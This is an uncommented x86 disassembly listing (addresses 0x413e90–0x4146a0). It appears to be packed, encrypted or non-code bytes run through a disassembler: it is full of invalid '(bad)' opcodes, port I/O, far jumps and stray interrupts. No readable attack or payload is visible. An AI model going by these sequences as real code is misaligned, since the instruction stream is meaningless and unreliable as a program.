  413e90:	mov    ds:0xcd3d7a18,eax
  413e95:	sbb    eax,0x8485420d
  413e9a:	int    0xdd
  413e9c:	and    al,0xd5
  413e9e:	ret    
  413e9f:	daa    
  413ea0:	mov    edi,DWORD PTR ds:0x1de466bf
  413ea6:	into   
  413ea7:	xor    cl,dl
  413ea9:	in     al,0xfb
  413eab:	jmp    0x413ef5
  413ead:	int    0x26
  413eaf:	pop    ebp
  413eb0:	pop    ds
  413eb1:	iret   
  413eb2:	push   cs
  413eb3:	ins    DWORD PTR es:[edi],dx
  413eb4:	ror    DWORD PTR [ebx],0x5c
  413eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eb8:	add    eax,0xc7c1274f
  413ebd:	xchg   esi,eax
  413ebe:	(bad)  
  413ebf:	mov    dh,bh
  413ec1:	xchg   edx,eax
  413ec2:	adc    edi,esi
  413ec4:	shl    BYTE PTR [esi],1
  413ec6:	ds loope 0x413ed3
  413ec9:	mov    DWORD PTR [ebp-0x18],ebp
  413ecc:	ins    BYTE PTR es:[edi],dx
  413ecd:	out    0x47,al
  413ecf:	fdivr  DWORD PTR [edi]
  413ed1:	das    
  413ed2:	mov    eax,0xf231bd49
  413ed7:	out    0x78,al
  413ed9:	pop    edi
  413eda:	not    DWORD PTR [edx]
  413edc:	inc    ebp
  413edd:	cmp    al,0x7c
  413edf:	jmp    0xac37ef70
  413ee4:	(bad)  
  413ee5:	cs add DWORD PTR gs:[bx+si],0xffffff86
  413eeb:	jmp    0x38dd:0x8d4d8438
  413ef2:	jle    0x413f6c
  413ef4:	arpl   WORD PTR [eax],cx
  413ef6:	mov    dh,0x10
  413ef8:	xor    bh,BYTE PTR [edi-0x2421bc4b]
  413efe:	cmp    esp,DWORD PTR [edi-0x598342f6]
  413f04:	inc    edi
  413f05:	lock pop ss
  413f07:	popf   
  413f08:	inc    edi
  413f09:	xor    ah,dl
  413f0b:	out    dx,eax
  413f0c:	ret    
  413f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0e:	sahf   
  413f0f:	shl    DWORD PTR [ebx],0x7a
  413f12:	or     esp,eax
  413f14:	in     al,dx
  413f15:	jmp    0xf74c:0x49764dee
  413f1c:	loopne 0x413f43
  413f1e:	mov    esi,0xfaef58b1
  413f23:	xor    DWORD PTR [edx-0x14d57bea],ecx
  413f29:	and    bh,ch
  413f2b:	add    al,ch
  413f2d:	sub    ebp,DWORD PTR [edi+0x67]
  413f30:	push   es
  413f31:	pop    edi
  413f32:	xor    eax,DWORD PTR [eax+edx*2]
  413f35:	daa    
  413f36:	jle    0x413f25
  413f38:	sbb    DWORD PTR [edi+0x4f],ebp
  413f3b:	fdivr  QWORD PTR [edi+ebp*2]
  413f3e:	add    al,0x1f
  413f40:	adc    eax,0xa95b2ea3
  413f45:	test   DWORD PTR [ebx-0x79f31d19],ebp
  413f4b:	mov    ecx,0x7c1ada2e
  413f50:	shr    BYTE PTR [esi-0xe],1
  413f53:	inc    ecx
  413f54:	push   ebx
  413f55:	fwait
  413f56:	xchg   edi,eax
  413f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f58:	mov    ebp,DWORD PTR [edi+0x60810969]
  413f5e:	jmp    0x5e547390
  413f63:	pop    edx
  413f64:	mov    al,0xcf
  413f66:	dec    BYTE PTR [eax+ebp*2-0x50f8124c]
  413f6d:	loope  0x413f5c
  413f6f:	outs   dx,BYTE PTR ds:[esi]
  413f70:	outs   dx,DWORD PTR ds:[esi]
  413f71:	loopne 0x413fd3
  413f73:	xchg   edx,eax
  413f74:	cdq    
  413f75:	cld    
  413f76:	xchg   ecx,eax
  413f77:	sbb    al,0x9e
  413f79:	pop    ebp
  413f7a:	add    DWORD PTR [esi+0x3d8825ef],ebp
  413f80:	xchg   edi,eax
  413f81:	stos   DWORD PTR es:[edi],eax
  413f82:	not    DWORD PTR [edi-0x2c60f7db]
  413f88:	fisubr DWORD PTR [eax+0x39]
  413f8b:	sbb    DWORD PTR [eax],ebp
  413f8d:	outs   dx,DWORD PTR ds:[esi]
  413f8e:	adc    ebx,edx
  413f90:	aad    0xb5
  413f92:	daa    
  413f93:	leave  
  413f94:	into   
  413f95:	sub    DWORD PTR [esi],edx
  413f97:	shl    BYTE PTR [esi+eax*8-0x65],cl
  413f9b:	or     al,0x74
  413f9d:	enter  0x25d3,0xa7
  413fa1:	cmp    al,0x29
  413fa3:	out    0x89,eax
  413fa5:	cmp    bl,BYTE PTR [eax+0x79739cb6]
  413fab:	sbb    bh,cl
  413fad:	adc    al,0xec
  413faf:	dec    edx
  413fb0:	mov    eax,ds:0xa8af547c
  413fb5:	inc    edi
  413fb6:	cmp    bl,BYTE PTR [edx+0x27]
  413fb9:	in     eax,dx
  413fba:	dec    edi
  413fbb:	sub    cl,BYTE PTR [ecx+0xf]
  413fbe:	out    0xe7,al
  413fc0:	dec    ebp
  413fc1:	and    cl,BYTE PTR [ecx+0x27]
  413fc4:	arpl   WORD PTR [edi+0x473e1691],bp
  413fca:	shl    BYTE PTR [eax-0x2c44c8a9],0x35
  413fd1:	mov    ds:0x95db1707,eax
  413fd6:	rcr    DWORD PTR [edi+0x73cfef90],1
  413fdc:	xor    eax,0xe0e0eaf8
  413fe1:	jmp    0xe25a47d9
  413fe6:	mov    al,ds:0x2177a1db
  413feb:	icebp  
  413fec:	xchg   edx,eax
  413fed:	xchg   edx,eax
  413fee:	xchg   ebx,eax
  413fef:	stos   BYTE PTR es:[edi],al
  413ff0:	sbb    BYTE PTR [ebx],ch
  413ff2:	daa    
  413ff3:	xchg   esi,eax
  413ff4:	sub    dh,BYTE PTR [esi+esi*8+0x3f]
  413ff8:	or     al,0x80
  413ffa:	shl    DWORD PTR [esi],cl
  413ffc:	xor    al,0xe4
  413ffe:	sub    DWORD PTR [ebx+0x5f8883ae],edi
  414004:	sub    DWORD PTR [edx-0x14],ecx
  414007:	outs   dx,BYTE PTR ds:[esi]
  414008:	mov    ecx,0x7399787a
  41400d:	jo     0x413fd9
  41400f:	lahf   
  414010:	cld    
  414011:	mov    bh,0x47
  414013:	out    0x9e,al
  414015:	in     al,dx
  414016:	dec    esp
  414017:	loope  0x413fc9
  414019:	jnp    0x413fe3
  41401b:	push   0x71
  41401d:	ins    DWORD PTR es:[edi],dx
  41401e:	mov    edx,0x8dbe3cbb
  414023:	lods   eax,DWORD PTR ds:[esi]
  414024:	dec    edx
  414026:	aam    0x71
  414028:	cld    
  414029:	push   0x73252be4
  41402e:	cmp    ah,cl
  414030:	mov    al,ds:0x151cd768
  414035:	add    al,0x32
  414037:	outs   dx,BYTE PTR ds:[esi]
  414038:	mov    dl,cl
  41403a:	out    0xf2,eax
  41403c:	dec    edi
  41403d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41403e:	lea    esi,[ebx]
  414040:	xchg   DWORD PTR [ebp+ebx*4-0x7f],eax
  414044:	fist   DWORD PTR [ecx+0x6d40d582]
  41404a:	pop    edx
  41404b:	aad    0xe8
  41404d:	xchg   BYTE PTR [ecx],ch
  41404f:	xor    DWORD PTR gs:[esi+0x2a],esi
  414053:	sub    DWORD PTR [esi-0x476f4d57],eax
  414059:	add    bh,BYTE PTR [esp+ebx*4+0xf904527]
  414060:	sbb    ecx,DWORD PTR [eax+0x1d7ef06d]
  414066:	or     DWORD PTR [edi+0x5b],ecx
  414069:	jbe    0x414089
  41406b:	add    al,0xda
  41406d:	jmp    0x41401c
  41406f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414070:	sub    cl,BYTE PTR [edx-0x738ccf3b]
  414076:	cmc    
  414077:	daa    
  414078:	lds    ebx,FWORD PTR [ebx-0x17]
  41407b:	pop    edx
  41407c:	push   esi
  41407d:	sar    BYTE PTR [esp+ecx*4+0x3588f780],1
  414084:	into   
  414085:	pop    es
  414086:	inc    eax
  414087:	(bad)  
  414088:	cmp    DWORD PTR [esi+0x5dee2eeb],eax
  41408e:	shl    BYTE PTR ds:0xfa3dc5a2,0xfb
  414095:	call   0x2e4c:0x7d0c11ca
  41409c:	out    dx,al
  41409d:	sti    
  41409e:	push   0x6a
  4140a0:	fdiv   DWORD PTR [ebp+0x4d49e10c]
  4140a6:	mov    ch,0xe9
  4140a8:	iret   
  4140a9:	push   esp
  4140aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ab:	je     0x4140ba
  4140ad:	sahf   
  4140ae:	add    ecx,ebp
  4140b0:	cmp    eax,0xb7da1878
  4140b5:	dec    edi
  4140b6:	icebp  
  4140b7:	ja     0x414074
  4140b9:	jg     0x414094
  4140bb:	push   ebx
  4140bc:	mov    bh,0xd
  4140be:	inc    ebp
  4140bf:	loope  0x41413e
  4140c1:	mov    eax,0x391e08b0
  4140c6:	jle    0x414092
  4140c8:	push   0x40
  4140ca:	push   ecx
  4140cb:	mov    eax,DWORD PTR [edi+eiz*4]
  4140ce:	or     DWORD PTR [eax],esi
  4140d0:	push   eax
  4140d1:	push   esi
  4140d2:	mov    eax,0x3382ee9e
  4140d7:	mov    ds:0x1980de6e,eax
  4140dc:	mov    eax,ds:0x2583db3e
  4140e1:	sar    DWORD PTR [ebx+0x6527bf5a],1
  4140e7:	sbb    BYTE PTR [edx-0x6c820b61],bh
  4140ed:	sti    
  4140ee:	int    0xe9
  4140f0:	and    DWORD PTR [esi],ebx
  4140f2:	xor    eax,0xf4deb560
  4140f7:	jge    0x4140cf
  4140f9:	jb     0x414086
  4140fb:	pop    ds
  4140fc:	stos   DWORD PTR es:[edi],eax
  4140fd:	adc    BYTE PTR [esi],dh
  4140ff:	dec    ebx
  414100:	sti    
  414101:	adc    bh,BYTE PTR ds:0x6804250a
  414107:	jns    0x4140c7
  414109:	jp     0x4140d0
  41410b:	repz addr16 pusha 
  41410e:	mov    ah,0x37
  414110:	outs   dx,BYTE PTR ds:[esi]
  414111:	jbe    0x414145
  414113:	retf   
  414114:	out    0xb1,al
  414116:	(bad)  
  414117:	mov    ds:0x1508fa78,eax
  41411c:	(bad)  
  41411d:	je     0x414197
  41411f:	fisubr DWORD PTR [eax+0x74]
  414122:	jne    0x4140d8
  414124:	dec    eax
  414125:	call   0x7a96:0x6183343
  41412c:	pop    ss
  41412d:	pop    esi
  41412e:	xor    eax,0x8373e3ba
  414133:	(bad)  [eax+0x7ecc5298]
  414139:	jno    0x41417c
  41413b:	fcmovbe st,st(3)
  41413d:	inc    ebx
  41413e:	jg     0x4140de
  414140:	(bad)  
  414141:	pop    ebp
  414142:	mov    bl,0x9a
  414144:	add    esi,DWORD PTR [edx-0x69]
  414147:	retf   
  414148:	mov    cl,dl
  41414a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41414b:	dec    ebx
  41414c:	nop
  41414d:	jnp    0x4140f6
  41414f:	or     ch,BYTE PTR [esp+0x733351e4]
  414156:	ins    DWORD PTR es:[edi],dx
  414157:	cmp    ch,BYTE PTR [ebx-0x60]
  41415a:	jmp    0x9c4b8907
  41415f:	ret    
  414160:	clc    
  414161:	mul    BYTE PTR ds:[ecx+0x604bec33]
  414168:	in     eax,0x84
  41416a:	and    dl,ch
  41416c:	pop    ecx
  41416d:	adc    DWORD PTR [ecx],edx
  41416f:	cs sbb dh,bh
  414172:	inc    ebp
  414173:	call   0xd182:0xf845ca65
  41417a:	jno    0x4141ed
  41417c:	lods   al,BYTE PTR ds:[esi]
  41417d:	mov    ds:0xd1d24119,eax
  414182:	mov    cl,0x9b
  414184:	loope  0x4141b9
  414186:	dec    eax
  414187:	add    eax,0xf258b1fc
  41418c:	cmp    dh,BYTE PTR [edi+0x5f]
  41418f:	cld    
  414190:	mov    eax,0x7acf2e44
  414195:	lahf   
  414196:	or     ecx,esi
  414198:	inc    esp
  414199:	jne    0x4141cc
  41419b:	jnp    0x4141a7
  41419d:	loop   0x41419d
  41419f:	pop    edx
  4141a0:	or     eax,0x8a77f11d
  4141a5:	add    esi,eax
  4141a7:	fisubr WORD PTR [edi-0x43f9b79d]
  4141ad:	jbe    0x41416a
  4141af:	outs   dx,DWORD PTR ds:[esi]
  4141b0:	and    DWORD PTR [edi],edi
  4141b2:	cmp    dl,BYTE PTR [esi+0x7328cf5]
  4141b8:	cdq    
  4141b9:	add    al,0xe5
  4141bb:	into   
  4141bc:	xrelease mov DWORD PTR [edi],0x79433ed3
  4141c3:	lea    edi,[edi-0x17]
  4141c6:	clc    
  4141c7:	sbb    eax,0xdcfcea07
  4141cc:	in     eax,dx
  4141cd:	jmp    0x414206
  4141cf:	clc    
  4141d0:	lock std 
  4141d2:	adc    ecx,eax
  4141d4:	out    0x97,al
  4141d6:	stos   DWORD PTR es:[edi],eax
  4141d7:	cs adc al,dh
  4141da:	scas   al,BYTE PTR es:[edi]
  4141db:	test   bl,0x88
  4141de:	jne    0x41421e
  4141e0:	mov    al,ds:0x7decf82c
  4141e5:	mov    bl,0x7d
  4141e7:	nop
  4141e8:	push   DWORD PTR [eax]
  4141ea:	arpl   WORD PTR [edi+0x77],ax
  4141ed:	xchg   esp,eax
  4141ee:	aad    0x17
  4141f0:	enter  0xf67f,0xb6
  4141f4:	xlat   BYTE PTR ds:[ebx]
  4141f5:	ds cdq 
  4141f7:	and    ebp,DWORD PTR ds:0x3ce7f1da
  4141fd:	(bad)  
  4141fe:	and    bl,bh
  414200:	retf   0x4d18
  414203:	loopne 0x41420f
  414205:	and    eax,0xb889d1cf
  41420a:	xchg   ecx,eax
  41420b:	dec    eax
  41420c:	mov    cl,0x94
  41420e:	test   al,0xa1
  414210:	(bad)  
  414212:	xchg   esp,eax
  414213:	xchg   DWORD PTR [ecx+0x63],esp
  414216:	inc    esi
  414217:	cwde   
  414218:	sub    eax,0xce9cd98b
  41421d:	fwait
  41421e:	adc    al,0x69
  414220:	stos   DWORD PTR es:[edi],eax
  414221:	stos   BYTE PTR es:[edi],al
  414222:	(bad)  
  414223:	arpl   sp,bp
  414225:	lock shl DWORD PTR fs:[ebp+0x34e7df9b],cl
  41422d:	and    ebp,DWORD PTR [ebx+0x6b]
  414230:	jae    0x414203
  414232:	push   ds
  414233:	dec    edi
  414234:	push   edi
  414235:	xor    al,0xef
  414237:	pop    ds
  414238:	jg     0x4142a3
  41423a:	sbb    dh,BYTE PTR [eax+eiz*1+0x7e47809d]
  414241:	xor    ebx,ebx
  414243:	out    0x35,al
  414245:	jmp    0x88a98306
  41424a:	bound  edi,QWORD PTR [esi]
  41424c:	ds das 
  41424e:	inc    esp
  41424f:	arpl   WORD PTR [edi+eax*4-0x2b],cx
  414253:	ret    0x342e
  414256:	adc    al,0x7d
  414258:	adc    bh,bh
  41425a:	popf   
  41425b:	jno    0x4141f9
  41425d:	mov    cl,0x9d
  41425f:	push   esi
  414260:	aas    
  414261:	ds sub eax,0xc1ba7177
  414267:	mov    al,ds:0xf998ae20
  41426c:	xchg   esp,ebp
  41426e:	test   DWORD PTR [edi],ebx
  414270:	cmp    al,0x93
  414272:	and    eax,0x91f2d20d
  414277:	pop    edi
  414278:	pop    esp
  414279:	mov    ch,0x63
  41427b:	mov    bl,0xf
  41427d:	mov    WORD PTR [ebx+0x76],cs
  414280:	(bad)
  414283:	dec    BYTE PTR [ebp+0x6d]
  414286:	int    0x5d
  414288:	out    dx,eax
  414289:	fidiv  WORD PTR [edi+0x68c1b5c]
  41428f:	addr16 push edx
  414291:	loope  0x414263
  414293:	and    BYTE PTR [eax+0x34a4e018],cl
  414299:	call   0x3033563
  41429e:	loope  0x4142b4
  4142a0:	dec    ecx
  4142a1:	jns    0x414254
  4142a3:	pop    edi
  4142a4:	jns    0x4142c9
  4142a6:	ins    DWORD PTR es:[edi],dx
  4142a7:	xchg   ebp,eax
  4142a8:	jmp    FWORD PTR [ecx]
  4142aa:	push   ecx
  4142ab:	inc    esp
  4142ac:	mov    bl,0x5c
  4142ae:	inc    BYTE PTR [edx]
  4142b0:	dec    esp
  4142b1:	sbb    edi,DWORD PTR [ecx+ebp*8+0x120af845]
  4142b8:	icebp  
  4142b9:	xchg   BYTE PTR [edi],bh
  4142bb:	mov    eax,ds:0x20cfe02c
  4142c0:	call   0xfe8cde98
  4142c5:	std    
  4142c6:	stos   BYTE PTR es:[edi],al
  4142c7:	adc    DWORD PTR [edx+0x5],esp
  4142ca:	fldcw  WORD PTR [edi]
  4142cc:	ret    0x4c8f
  4142cf:	and    al,0xa2
  4142d1:	mov    ch,0x9
  4142d3:	mov    BYTE PTR [edi-0x5d6f24d6],cl
  4142d9:	cli    
  4142da:	cmc    
  4142db:	test   edi,0x516475af
  4142e1:	sbb    ah,BYTE PTR [ecx-0x1d27f635]
  4142e7:	sub    al,0xc5
  4142e9:	xchg   DWORD PTR [edx-0x4c],ecx
  4142ec:	jns    0x4142db
  4142ee:	mov    bl,0x35
  4142f0:	mov    edi,0x4472bd52
  4142f5:	fs mov dh,0xf1
  4142f8:	and    al,0x18
  4142fa:	jnp    0x414340
  4142fc:	je     0x414291
  4142fe:	push   edi
  4142ff:	cs dec ecx
  414301:	push   es
  414302:	shl    DWORD PTR [edi],0xb7
  414305:	or     eax,0x88289d0c
  41430a:	mov    dh,0x90
  41430c:	cmp    BYTE PTR [ebx],bl
  41430e:	add    eax,0x4836bb97
  414313:	repnz push 0xffffffb1
  414316:	stc    
  414317:	cmp    BYTE PTR [esi],0xff
  41431a:	pop    es
  41431b:	add    al,0x28
  41431d:	lock inc ebx
  41431f:	(bad)  
  414320:	daa    
  414321:	into   
  414322:	mov    esp,0xc9f75856
  414327:	ja     0x414360
  414329:	pop    es
  41432a:	mov    DWORD PTR [ebx+ebp*8+0x20],edi
  41432e:	popa   
  41432f:	in     al,dx
  414330:	add    al,0xf4
  414332:	shl    BYTE PTR [ebp+0x2f],1
  414335:	mov    cl,bh
  414337:	mov    ecx,0x45b734f
  41433c:	int3   
  41433d:	mov    ebx,0x5565737b
  414342:	adc    esi,ebx
  414344:	mov    BYTE PTR [esi],ah
  414346:	xor    eax,0xf3d06323
  41434b:	mov    dh,0x37
  41434d:	sub    BYTE PTR [edx+edx*2-0x609b8726],bh
  414354:	shl    DWORD PTR [eax+eax*4+0x6f],0x5f
  414359:	dec    esp
  41435a:	xlat   BYTE PTR ds:[ebx]
  41435b:	hlt    
  41435c:	jecxz  0x414302
  41435e:	cmp    ecx,DWORD PTR [esi]
  414360:	sbb    ecx,DWORD PTR [edi+0x8a65f00]
  414366:	add    dl,BYTE PTR [eax+edi*4+0x1aca60bc]
  41436d:	test   cl,al
  41436f:	jae    0x414342
  414371:	jns    0x414379
  414373:	lds    eax,FWORD PTR [edx]
  414375:	stc    
  414376:	es jecxz 0x414396
  414379:	mov    dl,0x4f
  41437b:	dec    esp
  41437c:	scas   al,BYTE PTR es:[edi]
  41437d:	bnd jno 0x4143e0
  414380:	nop
  414381:	ja     0x414388
  414383:	into   
  414384:	push   0x2c
  414386:	jmp    0xbcdb:0x16d1460c
  41438d:	cmp    BYTE PTR [edx-0x3d],al
  414390:	dec    ebx
  414391:	dec    esi
  414392:	and    dh,BYTE PTR [esi]
  414394:	cmp    BYTE PTR [ecx+0x41],cl
  414397:	jge    0x41438a
  414399:	adc    dh,BYTE PTR [esi]
  41439b:	ins    BYTE PTR es:[edi],dx
  41439c:	jns    0x4143af
  41439e:	and    BYTE PTR [ebx+0x57],bl
  4143a1:	xor    ah,BYTE PTR [edi]
  4143a3:	adc    ecx,ecx
  4143a5:	cwde   
  4143a6:	dec    ecx
  4143a7:	cli    
  4143a8:	je     0x4143d9
  4143aa:	adc    dl,BYTE PTR [ecx+0x23097303]
  4143b0:	jecxz  0x414332
  4143b2:	mov    ecx,0x7c463cca
  4143b7:	mov    ebp,0xb449fb9a
  4143bc:	jbe    0x4143ba
  4143be:	jnp    0x41439c
  4143c0:	test   cl,ah
  4143c2:	imul   edi,DWORD PTR [esp+esi*2-0x4d2d53ca],0xab7c9d48
  4143cd:	imul   edi,DWORD PTR [edi+0x1e],0x7d
  4143d1:	push   edx
  4143d2:	js     0x414408
  4143d4:	mov    ch,0xfe
  4143d6:	jge    0x4143c6
  4143d8:	adc    dl,BYTE PTR [ebx-0x72]
  4143db:	push   edi
  4143dd:	vpmaxub ymm5,ymm3,YMMWORD PTR [edx+ebp*2+0x7bd94541]
  4143e6:	xor    al,0xcc
  4143e8:	mov    esi,0x178cc5ab
  4143ed:	stc    
  4143ee:	lds    esp,FWORD PTR [eax-0x19]
  4143f1:	popf   
  4143f2:	mov    al,0x36
  4143f4:	gs bnd jns 0x41445f
  4143f8:	inc    ebp
  4143f9:	dec    ebx
  4143fa:	(bad)  
  4143fb:	out    dx,al
  4143fc:	into   
  4143fd:	je     0x4143a5
  4143ff:	or     DWORD PTR [edx+0xb],edx
  414402:	xor    edx,DWORD PTR [ebx-0x46]
  414405:	cs jp  0x4143c5
  414408:	and    al,BYTE PTR cs:0x33b6cfb5
  41440f:	ror    eax,1
  414411:	loopne 0x414485
  414413:	ja     0x4143e7
  414415:	popa   
  414416:	pop    esi
  414417:	mov    ch,0xb0
  414419:	mov    dl,0x12
  41441b:	jecxz  0x41440e
  41441d:	out    0x41,eax
  41441f:	xor    dl,BYTE PTR [eax]
  414421:	pop    ds
  414422:	js     0x414466
  414424:	xchg   ecx,eax
  414425:	and    cl,dh
  414427:	pop    ss
  414428:	mov    ebp,0xa2df0cda
  41442d:	or     al,0xf
  41442f:	sub    eax,0xce5a5a59
  414434:	int    0x62
  414436:	jle    0x414419
  414438:	cwde   
  414439:	jmp    DWORD PTR [edx-0x43]
  41443c:	adc    BYTE PTR [ecx+0x9],ah
  41443f:	in     eax,dx
  414440:	sbb    DWORD PTR [esp+ebx*4],ebp
  414443:	dec    esp
  414444:	arpl   bp,dx
  414446:	adc    DWORD PTR [esi],esi
  414448:	adc    BYTE PTR [ebx],bl
  41444a:	mov    DWORD PTR [edx-0x1c5d8fb6],esp
  414450:	call   0xe328:0xa770b8ad
  414457:	cdq    
  414458:	stos   BYTE PTR es:[edi],al
  414459:	icebp  
  41445a:	or     eax,0xeddf83d8
  41445f:	jb     0x414480
  414461:	sbb    eax,0x47008b90
  414466:	inc    ecx
  414467:	fidivr DWORD PTR [ebx+0x7f]
  41446a:	pop    ss
  41446b:	shr    BYTE PTR [ebx-0x3a30c15e],0x1e
  414472:	arpl   WORD PTR [ecx+0x48],dx
  414475:	jne    0x4144cc
  414477:	fidiv  WORD PTR ds:0x83a6fbff
  41447d:	call   0x15a8:0xbc120099
  414484:	jno    0x414455
  414486:	mov    DWORD PTR [ebp-0x7],eax
  414489:	lods   al,BYTE PTR ds:[esi]
  41448a:	pop    ss
  41448b:	test   al,0x11
  41448e:	clc    
  41448f:	and    DWORD PTR [eax+0x2d],edx
  414492:	popf   
  414493:	data16 (bad) 
  414496:	js     0x41441a
  414498:	(bad)  
  41449a:	fsubrp st(3),st
  41449c:	in     eax,dx
  41449d:	test   DWORD PTR [ecx-0x37eae4a3],esp
  4144a3:	xchg   ebx,eax
  4144a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a5:	(bad)  
  4144a6:	xor    al,0xbe
  4144a8:	mov    edx,0x7096268e
  4144ad:	push   esi
  4144ae:	and    edx,esp
  4144b0:	clc    
  4144b1:	sub    dl,bh
  4144b3:	popf   
  4144b4:	(bad)  
  4144b5:	cmovbe ebx,DWORD PTR fs:[ecx]
  4144b9:	push   edx
  4144ba:	enter  0x9d7e,0xe
  4144be:	push   esi
  4144bf:	(bad)  
  4144c0:	mov    edi,0xbeb26864
  4144c5:	add    eax,0x3659f67e
  4144ca:	mov    dh,0xed
  4144cc:	sbb    BYTE PTR [eax-0x57775fc5],bh
  4144d2:	sbb    dl,BYTE PTR [edx-0x41]
  4144d5:	push   edx
  4144d6:	js     0x414490
  4144d8:	out    dx,al
  4144d9:	or     DWORD PTR [eax],0x63
  4144dc:	jns    0x4144e3
  4144de:	add    eax,0xe9a09b96
  4144e3:	inc    ecx
  4144e4:	arpl   WORD PTR [edi-0x3d4b2421],bx
  4144ea:	aad    0x62
  4144ec:	out    dx,eax
  4144ed:	xor    ch,BYTE PTR [edx+edx*2-0x75]
  4144f1:	fsubr  DWORD PTR [eax]
  4144f3:	xchg   edx,eax
  4144f4:	jmp    0xded1:0x47a83ba4
  4144fb:	push   ebx
  4144fc:	loop   0x4144dd
  4144fe:	int    0x4b
  414500:	aad    0xd8
  414502:	jbe    0x414489
  414504:	call   0x28723427
  414509:	test   al,0x9f
  41450b:	cmp    eax,0x1c335fb
  414510:	sbb    edi,esp
  414512:	dec    esi
  414513:	je     0x414570
  414515:	sub    eax,0xc161e261
  41451a:	cli    
  41451b:	jo     0x4144b1
  41451d:	call   0xb05f:0xa2c2ba31
  414524:	(bad)  
  414525:	or     eax,0x35bd2c5f
  41452a:	pop    ss
  41452b:	les    edi,FWORD PTR [edx+0x75]
  41452e:	push   cs
  41452f:	sbb    edi,edx
  414531:	fcmove st,st(0)
  414533:	xor    eax,0x4a8c97de
  414538:	mov    ds:0x95da24b7,al
  41453d:	xchg   edi,eax
  41453e:	dec    esi
  41453f:	cmp    edi,DWORD PTR [ebp-0x63c26da5]
  414545:	sub    al,BYTE PTR [ecx]
  414547:	repz pushf 
  414549:	jnp    0x41459e
  41454b:	jle    0x414530
  41454d:	dec    ebx
  41454e:	push   0x22
  414550:	aas    
  414551:	jns    0x414517
  414553:	in     eax,dx
  414554:	cld    
  414555:	addr16 mov bl,0x15
  414558:	pop    edi
  414559:	dec    esi
  41455a:	outs   dx,DWORD PTR ds:[esi]
  41455b:	je     0x41452e
  41455d:	out    0xaa,eax
  41455f:	pop    ecx
  414560:	and    ebp,DWORD PTR [edx+0x62df32fa]
  414566:	jo     0x414540
  414568:	mov    esp,0x8fe53a89
  41456d:	mov    eax,0x82ba39b6
  414572:	add    BYTE PTR [ebx],bh
  414574:	add    DWORD PTR ss:[bx],0x23
  414579:	mov    edx,DWORD PTR [ebx+eiz*2-0x1022b38c]
  414580:	mov    ecx,0xb58e43b5
  414585:	mov    ds:0x8dca90,eax
  41458a:	mov    bl,0xcf
  41458c:	or     al,0xa9
  41458e:	xchg   ecx,eax
  41458f:	dec    ecx
  414590:	push   cs
  414591:	fimul  WORD PTR [eax-0x63b17b6b]
  414597:	mov    ds:0x6b2629aa,eax
  41459c:	mov    ebx,0x935aaaef
  4145a1:	outs   dx,DWORD PTR ds:[esi]
  4145a2:	retf   0x4b63
  4145a5:	cmp    al,0xf4
  4145a7:	push   ds
  4145a8:	movhps QWORD PTR [edi-0x60306a96],xmm0
  4145af:	ins    BYTE PTR es:[edi],dx
  4145b0:	pusha  
  4145b1:	or     al,0x38
  4145b3:	cs push ecx
  4145b5:	mov    dh,0x8f
  4145b7:	fidivr WORD PTR [eax-0xb67cde1]
  4145bd:	inc    esi
  4145be:	out    0x27,eax
  4145c0:	inc    esp
  4145c1:	push   esi
  4145c2:	sub    DWORD PTR [esp+ebx*4-0x7ec15466],0x8193ae21
  4145cd:	test   eax,0x2f484d5
  4145d2:	es push cs
  4145d4:	and    DWORD PTR ds:0x34f6b1a1,0xffffffa0
  4145db:	mov    ebp,0x9aff8f2a
  4145e0:	rcr    BYTE PTR es:[esi+0x1c2b5157],0xa8
  4145e8:	mov    ds:0xcb5c0b8d,eax
  4145ed:	enter  0x4b72,0xd9
  4145f1:	xor    dl,BYTE PTR [esi-0x4a]
  4145f4:	and    ah,cl
  4145f6:	xor    DWORD PTR [ebx+0x79],ebp
  4145f9:	fistp  WORD PTR [ebx+0x7d]
  4145fc:	push   ecx
  4145fd:	clc    
  4145fe:	lahf   
  4145ff:	push   edi
  414600:	jno    0x414617
  414602:	cli    
  414603:	test   DWORD PTR [edi],ebp
  414605:	icebp  
  414606:	ja     0x41461e
  414608:	mov    ds:0xb864752,eax
  41460d:	fld    QWORD PTR [eax]
  41460f:	xor    esp,DWORD PTR ds:0xd87a6f1d
  414615:	mov    dh,0xfb
  414617:	push   esp
  414618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414619:	mov    eax,ds:0xcd4c569d
  41461e:	mov    ch,0x31
  414620:	jno    0x41467c
  414622:	mov    ebx,0x50ed4a28
  414627:	pop    edi
  414628:	jmp    0x3eca41a8
  41462d:	das    
  41462e:	xchg   edx,eax
  41462f:	(bad)  
  414630:	jmp    0x41460a
  414632:	pop    esp
  414633:	sub    BYTE PTR [esi-0x3aca2b2e],al
  414639:	jns    0x4145d9
  41463b:	aam    0x4b
  41463d:	cmp    BYTE PTR ds:0xc5fcc379,0x98
  414644:	cmp    eax,0xab85460b
  414649:	pop    ecx
  41464a:	pop    ss
  41464b:	out    0x52,eax
  41464d:	xchg   ecx,eax
  41464e:	aaa    
  41464f:	sub    DWORD PTR [esi],ebp
  414651:	jb     0x414699
  414653:	lods   eax,DWORD PTR ds:[esi]
  414654:	add    dh,BYTE PTR [esi+0x4929db81]
  41465a:	add    DWORD PTR [ebx+0x5b8600af],esp
  414660:	sub    ebp,ebp
  414662:	fdivr  QWORD PTR [ebp-0xb]
  414665:	pop    ebp
  414666:	and    bh,BYTE PTR ds:0x69a1549d
  41466c:	retf   0xb42d
  41466f:	fwait
  414670:	loope  0x4146b6
  414672:	push   ebx
  414673:	retf   
  414674:	sbb    al,dh
  414676:	mov    edi,0xe0c3b637
  41467b:	adc    al,BYTE PTR [edx-0x8b80d4f]
  414681:	inc    eax
  414682:	pop    edi
  414683:	mov    ah,0x45
  414685:	and    eax,0x126c602f
  41468a:	sbb    DWORD PTR [edx-0x16642e58],0xf04548b7
  414694:	inc    esi
  414695:	inc    ecx
  414696:	lahf   
  414697:	pop    es
  414698:	or     al,BYTE PTR [ecx-0x25a2e272]
  41469e:	fistp  WORD PTR [ecx]
  4146a0:	cld    
